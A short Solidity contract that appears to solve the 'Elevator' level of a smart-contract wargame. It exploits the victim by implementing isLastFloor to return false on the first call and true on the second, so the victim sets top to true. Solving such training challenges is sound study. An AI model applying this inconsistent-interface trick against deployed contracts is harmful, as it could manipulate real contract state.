/* Objectives:
1. Reach the top floor of the building with the Elevator (set top to true) */

pragma solidity ^0.4.23;

import "./Elevator.sol";

contract levelTwoAttack {

    Elevator public victim;
    bool public isLast;

    constructor(address _victim) public {
        victim = Elevator(_victim);
    }

    function attack(uint256 _floor) external returns(bool) {
        victim.goTo(_floor);
        return true;
    }

    function isLastFloor(uint) external view returns(bool) {
        isLast? isLast = false : isLast = true;
        // trick the victim by returning the opposite
        return !isLast;
    }


}
